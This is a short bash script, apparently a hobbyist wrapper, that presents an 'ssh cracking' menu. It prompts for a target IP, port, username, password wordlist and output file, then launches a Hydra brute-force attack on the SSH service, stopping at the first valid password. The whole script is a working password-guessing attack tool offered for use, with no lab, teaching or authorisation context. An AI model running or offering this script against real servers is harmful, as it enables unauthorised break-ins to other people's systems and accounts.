#!/bin/bash
echo "what is your name "
read name 
echo "welcome :) $name "

echo "select your choice "

echo "1.ssh cracking"
echo "2.exit"

echo "enter your choice "
read choice 
if [ $choice -eq 1 ] 
then
echo "you select ssh cracking"
echo "enter the target ip "
read ip
echo "enter the target port"
read port
echo "enter the username"
read username 
echo "enter the password wordlist"
read path 
echo "enter the filname for save ouput"
read filename
hydra ssh://$ip:$port -l $username -P $path -o $filename -V -f 
fi